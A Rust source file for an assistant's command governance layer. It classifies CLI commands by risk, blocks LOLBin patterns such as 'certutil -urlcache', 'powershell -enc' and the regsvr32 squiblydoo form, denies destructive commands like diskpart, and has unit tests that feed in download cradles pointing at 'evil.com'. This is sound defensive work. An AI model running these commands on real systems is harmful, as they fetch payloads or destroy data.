#![allow(dead_code)]

use crate::bus::RiskLevel;
use jarvis_core::APP_LOG_DIR;

fn now_ms() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64
}

fn write_audit_entry(source: &str, cmd_type: &str, cli_cmd: &str, risk: &RiskLevel, allowed: bool, reason: &str) {
    let ts = now_ms();
    let cmd_esc = cli_cmd.replace('\\', "\\\\").replace('"', "\\\"");
    let reason_esc = reason.replace('\\', "\\\\").replace('"', "\\\"");
    let line = format!(
        "{{\"ts\":{},\"source\":\"{}\",\"cmd_type\":\"{}\",\"cmd\":\"{}\",\"risk\":\"{}\",\"allowed\":{},\"reason\":\"{}\"}}",
        ts, source, cmd_type, cmd_esc, risk.as_str(), allowed, reason_esc
    );
    if let Some(dir) = APP_LOG_DIR.get() {
        use std::io::Write;
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true).append(true)
            .open(dir.join("security_audit.jsonl"))
        {
            let _ = writeln!(f, "{}", line);
        }
    }
}

// ── Security mode ─────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SecurityMode {
    /// All medium+ actions require confirmation; High/Critical/Blocked always denied.
    Strict,
    /// Default: Low/Medium auto-allowed; High needs confirmation; Critical/Blocked denied.
    Balanced,
    /// Medium auto-allowed; High needs confirmation; Critical/Blocked denied. Reduced friction.
    Developer,
}

impl SecurityMode {
    pub fn from_str(s: &str) -> Self {
        match s.to_lowercase().as_str() {
            "strict" => SecurityMode::Strict,
            "developer" => SecurityMode::Developer,
            _ => SecurityMode::Balanced,
        }
    }
}

// ── Decision ──────────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct GovernanceDecision {
    pub allowed: bool,
    pub risk_level: RiskLevel,
    pub reason: String,
    pub requires_confirmation: bool,
}

impl GovernanceDecision {
    pub fn allow(risk_level: RiskLevel) -> Self {
        Self { allowed: true, risk_level, reason: String::new(), requires_confirmation: false }
    }

    pub fn deny(reason: impl Into<String>, risk_level: RiskLevel) -> Self {
        Self { allowed: false, risk_level, reason: reason.into(), requires_confirmation: false }
    }

    pub fn confirm_required(reason: impl Into<String>, risk_level: RiskLevel) -> Self {
        Self { allowed: true, risk_level, reason: reason.into(), requires_confirmation: true }
    }
}

// ── Capability set ────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Default)]
pub struct CapabilitySet {
    pub filesystem_write: bool,
    pub network_allowed: bool,
    pub shell_execution: bool,
    pub system_modification: bool,
    pub automation_allowed: bool,
    pub allowed_paths: Vec<String>,
}

// ── Governance layer ──────────────────────────────────────────────────────────

pub struct GovernanceLayer {
    pub mode: SecurityMode,
}

impl GovernanceLayer {
    pub fn new() -> Self {
        Self { mode: SecurityMode::Balanced }
    }

    pub fn with_mode(mode: SecurityMode) -> Self {
        Self { mode }
    }

    /// Check whether a command is permitted to execute.
    /// `source` identifies the caller ("voice", "text", "workflow", "replay").
    pub fn check_command(
        &self,
        cmd_type: &str,
        cli_cmd: &str,
        sandbox: &str,
        source: &str,
    ) -> GovernanceDecision {
        let risk = self.classify_command_risk(cmd_type, cli_cmd, sandbox);

        let decision = match (&risk, self.mode) {
            // Blocked is an unconditional policy deny — no mode can override it.
            (RiskLevel::Blocked, _) => GovernanceDecision::deny(
                format!("Policy-blocked pattern matched: '{}'", cli_cmd),
                RiskLevel::Blocked,
            ),
            // Critical is always denied.
            (RiskLevel::Critical, _) => GovernanceDecision::deny(
                format!("Critical-risk action blocked: '{}'", cli_cmd),
                RiskLevel::Critical,
            ),
            // High always requires confirmation.
            (RiskLevel::High, _) => GovernanceDecision::confirm_required(
                format!("High-risk action requires confirmation: '{}'", cli_cmd),
                RiskLevel::High,
            ),
            // Medium: Strict requires confirmation, others allow.
            (RiskLevel::Medium, SecurityMode::Strict) => GovernanceDecision::confirm_required(
                "Strict mode: medium-risk action requires confirmation".to_string(),
                RiskLevel::Medium,
            ),
            (other, _) => GovernanceDecision::allow(other.clone()),
        };

        write_audit_entry(source, cmd_type, cli_cmd, &decision.risk_level, decision.allowed, &decision.reason);
        decision
    }

    /// Classify the risk level of a CLI/AHK/Lua command.
    pub fn classify_command_risk(
        &self,
        cmd_type: &str,
        cli_cmd: &str,
        sandbox: &str,
    ) -> RiskLevel {
        // Lua with full sandbox = arbitrary code execution.
        if cmd_type == "lua" && sandbox == "full" {
            return RiskLevel::High;
        }

        let c = cli_cmd.to_lowercase();

        // LOLBin / LOLBAS patterns: unconditional block regardless of mode.
        // These are known living-off-the-land binaries used for payload download/execution.
        const BLOCKED_PATTERNS: &[&str] = &[
            "powershell -enc",        // encoded command — obfuscation vector
            "powershell -e ",         // short form of -encodedcommand
            "certutil -urlcache",     // download cradle
            "certutil -decode",       // base64 decode to executable
            "bitsadmin /transfer",    // out-of-band download
            "mshta http",             // HTA payload over network
            "mshta https",
            "regsvr32 /s /n /u /i:http", // squiblydoo
            "regsvr32 /s /n /u /i:https",
            "wmic process call create", // arbitrary process from wmi
        ];
        if BLOCKED_PATTERNS.iter().any(|pat| c.contains(pat)) {
            return RiskLevel::Blocked;
        }

        const CRITICAL: &[&str] = &[
            "format ", "diskpart", "cipher /w", "del /f /s /q",
            "rmdir /s", "rd /s",
        ];
        if CRITICAL.iter().any(|pat| c.contains(pat)) {
            return RiskLevel::Critical;
        }

        const HIGH: &[&str] = &[
            "shutdown", "restart-computer", "reg delete", "reg add",
            "net user", "net localgroup", "takeown", "icacls",
            "powershell -", "cmd /c", "wscript", "cscript", "mshta",
            "rundll32", "regsvr32",
        ];
        if HIGH.iter().any(|pat| c.starts_with(pat) || c.contains(pat)) {
            return RiskLevel::High;
        }

        const MEDIUM: &[&str] = &["del ", "rmdir", "remove-item", "move ", "ren ", "sc stop", "taskkill"];
        if MEDIUM.iter().any(|pat| c.starts_with(pat)) {
            return RiskLevel::Medium;
        }

        RiskLevel::Low
    }

    /// Quick permit check for workflow steps (registered workflows have slightly
    /// higher implicit trust than raw voice commands).
    pub fn check_workflow_step(&self, description: &str) -> GovernanceDecision {
        let d = description.to_lowercase();
        let risk = if d.contains("delete") || d.contains("format") || d.contains("shutdown") {
            RiskLevel::High
        } else if d.contains("install") || d.contains("uninstall") {
            RiskLevel::Medium
        } else {
            RiskLevel::Low
        };
        GovernanceDecision::allow(risk)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn gov() -> GovernanceLayer { GovernanceLayer::new() }
    fn strict() -> GovernanceLayer { GovernanceLayer::with_mode(SecurityMode::Strict) }

    // S3: shell injection patterns must be blocked or require confirmation
    #[test]
    fn s3_shell_injection_cmd_c_is_high() {
        let risk = gov().classify_command_risk("cli", "cmd /c whoami", "standard");
        assert!(matches!(risk, RiskLevel::High | RiskLevel::Critical | RiskLevel::Blocked));
    }

    // S4: PowerShell encoded command is Blocked (LOLBin pattern)
    #[test]
    fn s4_powershell_enc_is_blocked() {
        let risk = gov().classify_command_risk("cli", "powershell -enc dQBzAGUAcg==", "standard");
        assert_eq!(risk, RiskLevel::Blocked);
    }

    #[test]
    fn s4_certutil_urlcache_is_blocked() {
        let risk = gov().classify_command_risk("cli", "certutil -urlcache -split -f http://evil.com/p.exe", "standard");
        assert_eq!(risk, RiskLevel::Blocked);
    }

    // S7: dangerous commands require confirmation or are denied
    #[test]
    fn s7_shutdown_requires_confirmation() {
        let dec = gov().check_command("cli", "shutdown /s /t 0", "standard", "voice");
        assert!(!dec.allowed || dec.requires_confirmation);
    }

    #[test]
    fn s7_diskpart_is_critical_deny() {
        let dec = gov().check_command("cli", "diskpart", "standard", "voice");
        assert!(!dec.allowed);
        assert_eq!(dec.risk_level, RiskLevel::Critical);
    }

    // Strict mode: medium-risk requires confirmation
    #[test]
    fn strict_mode_medium_requires_confirm() {
        let dec = strict().check_command("cli", "del temp.txt", "standard", "voice");
        assert!(dec.requires_confirmation || !dec.allowed);
    }

    // Blocked is unconditional regardless of mode
    #[test]
    fn blocked_pattern_denied_in_all_modes() {
        for mode in [SecurityMode::Strict, SecurityMode::Balanced, SecurityMode::Developer] {
            let gov = GovernanceLayer::with_mode(mode);
            let dec = gov.check_command("cli", "certutil -urlcache -f http://x.com/a.exe", "standard", "test");
            assert!(!dec.allowed, "mode={:?} should still deny", mode);
        }
    }
}
